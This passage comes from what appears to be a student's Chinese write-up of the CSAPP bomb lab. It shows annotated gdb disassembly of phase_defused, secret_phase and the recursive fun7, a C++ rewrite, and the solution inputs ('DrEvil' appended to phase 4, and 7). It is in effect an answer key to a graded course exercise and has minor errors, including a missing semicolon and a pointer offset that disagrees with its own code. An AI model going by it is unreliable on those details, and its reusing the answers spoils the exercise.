code-wrapper"><pre><code class="hljs asm">   0x080492b7 &lt;+76&gt;:movl   $0x804a3da,0x4(%esp);M[0x4+esp]=0x804a3da<br>   0x080492bf &lt;+84&gt;:lea    0x2c(%esp),%eax;eax=(0x2c+esp)<br>   0x080492c3 &lt;+88&gt;:mov    %eax,(%esp);M[esp]=eax=(0x2c+esp)<br>   0x080492c6 &lt;+91&gt;:call   0x8048fd4 &lt;strings_not_equal&gt;<br>   ;0x804a3da存储的字符串和(0x2c+esp)中的字符串的字符串进行比较。若相等则eax=0。<br>   ;0x804a3da存储的字符串为 &quot;DrEvil&quot; <br>   ;（0x2c+esp）存储的为&lt;__isoc99_sscanf@plt&gt;读入的第三个参数%s对应的字符串。<br>   0x080492cb &lt;+96&gt;:test   %eax,%eax<br>   0x080492cd &lt;+98&gt;:jne    0x80492ec &lt;phase_defused+129&gt;;如果eax!=0，则会跳过secret_phase<br>   0x080492cf &lt;+100&gt;:movl   $0x804a2a0,(%esp);M[esp]=0x804a2a0<br>   0x080492d6 &lt;+107&gt;:call   0x8048800 &lt;puts@plt&gt;<br>   ;查看0x804a2a0存储的值,得输出的字符串:&quot;Curses, you&#x27;ve found the secret phase!&quot;”<br>   0x080492db &lt;+112&gt;:movl   $0x804a2c8,(%esp);;M[esp]=0x804a2c8<br>   0x080492e2 &lt;+119&gt;:call   0x8048800 &lt;puts@plt&gt;<br>   ;查看0x804a2c8存储的值,得输出的字符串:&quot;But finding it and solving it are quite different...&quot;<br>   0x080492e7 &lt;+124&gt;:call   0x8048ec2 &lt;secret_phase&gt;;secret_phase:顾名思义，秘密关卡！<br>   0x080492ec &lt;+129&gt;:movl   $0x804a300,(%esp)<br>   0x080492f3 &lt;+136&gt;:call   0x8048800 &lt;puts@plt&gt;<br>   0x080492f8 &lt;+141&gt;:mov    0x7c(%esp),%eax;取出原%gs:0x14的值<br>   0x080492fc &lt;+145&gt;:xor    %gs:0x14,%eax;与现值异或<br>   0x08049303 &lt;+152&gt;:je     0x804930a &lt;phase_defused+159&gt;<br>   ;异或结果为0，栈保护者canary未被非法篡改，安全退出程序<br>   0x08049305 &lt;+154&gt;:call   0x80487d0 &lt;__stack_chk_fail@plt&gt; <br>   ;否则ZF=0,调用__stack_chk_fail，退出程序<br>   0x0804930a &lt;+159&gt;:add    $0x8c,%esp<br>   0x08049310 &lt;+165&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>此时需要找到地址0x804c4d0存储的是什么，哪来的<code>%d %d %s</code>。</p></li><li><p>故在进入每个关卡的函数的位置设断点，观察地址<code>0x804c4d0</code>存储值的变化，进行调试：</p><ul><li><p>进入前三关，皆无变化：</p><p><img src="/2021/04/01/bomblab/image-20210513204703675.png" alt="image-20210513204703675"></p></li><li><p>进入第4关，变化来了：</p><p><img src="/2021/04/01/bomblab/image-20210513204722687.png" alt="image-20210513204722687"></p></li><li><p>故<code>0x804c4d0</code>存储的是第4关的输入。</p></li></ul></li><li><p>我们在第4关的输入后增加字符串”DrEvil” ，即可打开秘密关卡secret_phase：</p><p><img src="/2021/04/01/bomblab/image-20210513205050635.png" alt="image-20210513205050635"></p><p><img src="/2021/04/01/bomblab/image-20210513205105128.png" alt="image-20210513205105128"></p></li></ul></li></ul><h5 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h5><ul><li><p>汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function secret_phase:<br>   0x08048ec2 &lt;+0&gt;:push   %ebx;ebx入栈<br>   0x08048ec3 &lt;+1&gt;:sub    $0x18,%esp;esp=esp-0x18，开辟栈帧空间<br>   0x08048ec6 &lt;+4&gt;:call   0x804910d &lt;read_line&gt;;读取一行，保存在eax中<br>   0x08048ecb &lt;+9&gt;:movl   $0xa,0x8(%esp);M[0x8+esp]=0xa=10--strtol的第3个参数<br>   0x08048ed3 &lt;+17&gt;:movl   $0x0,0x4(%esp);M[0x4+esp]=0--strtol的第2个参数<br>   0x08048edb &lt;+25&gt;:mov    %eax,(%esp);M[esp]=eax--strtol的第1个参数<br>   0x08048ede &lt;+28&gt;:call   0x80488e0 &lt;strtol@plt&gt;<br>   ;strtol将eax存储的字符串转化为10进制整数(使结果没有&quot;&quot;)，结束符为空字符。<br>   ;返回值10进制整数保存在eax<br>   0x08048ee3 &lt;+33&gt;:mov    %eax,%ebx;ebx=eax<br>   0x08048ee5 &lt;+35&gt;:lea    -0x1(%eax),%eax;eax=eax-1;<br>   0x08048ee8 &lt;+38&gt;:cmp    $0x3e8,%eax;比较eax和0x3e8<br>   0x08048eed &lt;+43&gt;:jbe    0x8048ef4 &lt;secret_phase+50&gt;;若eax&lt;=0x3e8，则不爆炸<br>   0x08048eef &lt;+45&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048ef4 &lt;+50&gt;:mov    %ebx,0x4(%esp);M[0x4+esp]=ebx<br>   0x08048ef8 &lt;+54&gt;:movl   $0x804c088,(%esp);M[esp]=0x804c088<br>   0x08048eff &lt;+61&gt;:call   0x8048e71 &lt;fun7&gt;<br>   ;调用函数fun7(0x804c088,ebx)，返回值保存在eax<br>   0x08048f04 &lt;+66&gt;:cmp    $0x4,%eax<br>   0x08048f07 &lt;+69&gt;:je     0x8048f0e &lt;secret_phase+76&gt;;若eax=4，则不爆炸且过关<br>   0x08048f09 &lt;+71&gt;:call   0x80490e6 &lt;explode_bomb&gt;<br>   0x08048f0e &lt;+76&gt;:movl   $0x804a240,(%esp);M[esp]=0x804a240<br>   0x08048f15 &lt;+83&gt;:call   0x8048800 &lt;puts@plt&gt;<br>   ;输出：&quot;Wow! You&#x27;ve defused the secret stage!&quot;<br>   0x08048f1a &lt;+88&gt;:call   0x804926b &lt;phase_defused&gt;;退出秘密关卡<br>   0x08048f1f &lt;+93&gt;:add    $0x18,%esp<br>   0x08048f22 &lt;+96&gt;:pop    %ebx<br>   0x08048f23 &lt;+97&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>其中，<code>fun7</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function fun7:<br>   0x08048e71 &lt;+0&gt;:push   %ebx;ebx入栈<br>   0x08048e72 &lt;+1&gt;:sub    $0x18,%esp;esp=esp-0x18，开辟栈帧空间<br>   0x08048e75 &lt;+4&gt;:mov    0x20(%esp),%edx;edx=M[0x20+esp]--第一个参数<br>   0x08048e79 &lt;+8&gt;:mov    0x24(%esp),%ecx;ecx=M[0x24+esp]--第二个参数<br>   0x08048e7d &lt;+12&gt;:test   %edx,%edx<br>   0x08048e7f &lt;+14&gt;:je     0x8048eb8 &lt;fun7+71&gt;;如果edx=0 跳转-&gt;return 0xffffffff<br>   0x08048e81 &lt;+16&gt;:mov    (%edx),%ebx;ebx=M[edx]<br>   0x08048e83 &lt;+18&gt;:cmp    %ecx,%ebx<br>   0x08048e85 &lt;+20&gt;:jle    0x8048e9a &lt;fun7+41&gt;;如果ebx&lt;=ecx(有符号数)，跳转至&lt;fun7+41&gt;<br>   0x08048e87 &lt;+22&gt;:mov    %ecx,0x4(%esp);M[0x4+esp]=ecx<br>   0x08048e8b &lt;+26&gt;:mov    0x4(%edx),%eax;eax=M[0x4+edx]<br>   0x08048e8e &lt;+29&gt;:mov    %eax,(%esp);M[esp]=eax=M[0x4+edx]<br>   0x08048e91 &lt;+32&gt;:call   0x8048e71 &lt;fun7&gt;;递归调用函数fun7(M[0x4+edx],ecx)<br>   0x08048e96 &lt;+37&gt;:add    %eax,%eax;eax=2*fun7(M[0x4+edx],ecx)<br>   0x08048e98 &lt;+39&gt;:jmp    0x8048ebd &lt;fun7+76&gt;;跳转-&gt; return 2*fun7(M[0x4+edx],ecx);<br>   0x08048e9a &lt;+41&gt;:mov    $0x0,%eax;eax=0<br>   0x08048e9f &lt;+46&gt;:cmp    %ecx,%ebx<br>   0x08048ea1 &lt;+48&gt;:je     0x8048ebd &lt;fun7+76&gt;;如果ebx=ecx，跳转-&gt; return 0；<br>   0x08048ea3 &lt;+50&gt;:mov    %ecx,0x4(%esp);M[0x4+esp]=ecx<br>   0x08048ea7 &lt;+54&gt;:mov    0x8(%edx),%eax;eax=M[0x8+edx]<br>   0x08048eaa &lt;+57&gt;:mov    %eax,(%esp);M[esp]=eax<br>   0x08048ead &lt;+60&gt;:call   0x8048e71 &lt;fun7&gt;;递归调用函数fun7(M[0x8+edx],ecx)<br>   0x08048eb2 &lt;+65&gt;:lea    0x1(%eax,%eax,1),%eax;return eax=2*fun7(M[0x8+edx],ecx)+1<br>   0x08048eb6 &lt;+69&gt;:jmp    0x8048ebd &lt;fun7+76&gt;<br>   0x08048eb8 &lt;+71&gt;:mov    $0xffffffff,%eax<br>   0x08048ebd &lt;+76&gt;:add    $0x18,%esp<br>   0x08048ec0 &lt;+79&gt;:pop    %ebx<br>   0x08048ec1 &lt;+80&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>显然fun7是个含2个参数的递归函数，C++代码可如下表示：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fun7</span><span class="hljs-params">(<span class="hljs-type">int</span> *p,<span class="hljs-type">int</span> m)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(p==<span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span>(*p&lt;m)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*<span class="hljs-built_in">fun7</span>(*(p+<span class="hljs-number">2</span>),m)+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(*p==m)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*<span class="hljs-built_in">fun7</span>(*(p+<span class="hljs-number">1</span>),m);<br>&#125; <br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>这个递归的返回值为0时结束递归，对于每个返回值，根据与m的大小关系，有两个递归分支，分别是$2<em>fun7(</em>(p+2),m)+1$和$2<em>fun7(</em>(p+1),m)$。</p></li><li><p>fun7最终的返回值为4，故<code>0-&gt;1-&gt;2-&gt;4</code>为递归返回的路径，则递归调用时地址的增量为0x4,0x4,0x8。</p><p><img src="/2021/04/01/bomblab/image-20210514111858675.png" alt="image-20210514111858675"></p></li><li><p>故<code>m=7</code>，使得在最后一层递归返回0。整个过程如下：</p><ol><li><code>*p=24&gt;m,return 2*fun7(*(p+1),m)</code></li><li><code>*p=8&gt;m,return 2*fun7(*(p+1),m)</code></li><li><code>*p=6&lt;m,return 2*fun7(*(p+1),m)+1</code></li><li><code>*p=7=m,return 0</code></li></ol></li></ul></li></ul></li></ul></li><li><p>输入7，fun7得到返回值4，通关：</p><p><img src="/2021/04/01/bomblab/image-20210514112742119.png" alt="image-20210514112742119"></p></li></ul></li></ul><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/2021/04/01/bomblab/image-20210514112928319.png" alt="image-20210514112928319"></p><p><img src="/2021/04/01/bomblab/image-20210514112906727.png" alt="image-20210514112906727"></p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><ol><li><p>这次实验的各个关卡对汇编语言实现的功能各有侧重：</p><p>phase_1：字符串在内存地址中的存放、访问，字符串长度的获取与字符串的比较。</p><p>phase_2：利用循环得到存储等比数列的数组。</p><p>phase_3：实现switch语句，需要查看跳转表。</p><p>phase_4：递归函数的实现。</p><p>phase_5：数组及其索引。</p><p>phase_6：链表及其重组。</p><p>secret_phase：通过含指针参数的递归函数实现地址跳转。</p><p>通过学习、理解汇编代码在该实验中实现的各种功能，我对汇编代码的各种指令，如比较、跳转、调用指令等有了更深的理解。当遇到难以直接明白其功能的地方，我会尝试把汇编语言转换成自己编写的C++代码帮助理解，从而对汇编的功能实现有了更全面的认识。</p></li><li><p>在实验过程中难免需要对汇编代码进行调试，查看某个寄存器或在某个地址内存的值及其变化。所以gdb工具的使用是不可或缺的。正是通过完成这次实验，我对gdb工具的使用愈发熟练。</p></li><li><p>在进行函数调用时，栈帧的变化格外重要。通过这次实验对汇编代码的调试，思考在何处保存函数的参数、何处保存临时变量等，我对栈帧的结构有了更深刻的认识。</p></li><li><p>进行实验，细心和耐心也是很重要的品质。有时候会因为不够细心而耽误时间，如phase_4中我看反了两个输入参数的位置，但好在能够及时发现并改正。在遭遇比较复杂的结构，如phase_6中重构链表的双重循环，则需要耐心分析汇编语句。有了细心和耐心的加持，才能更好地闯关一个个关卡，收获知识，提升技能。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>《深入理解计算机系统》</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深入理解计算机系统</tag>
      
      <tag>CSAPP-LAB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
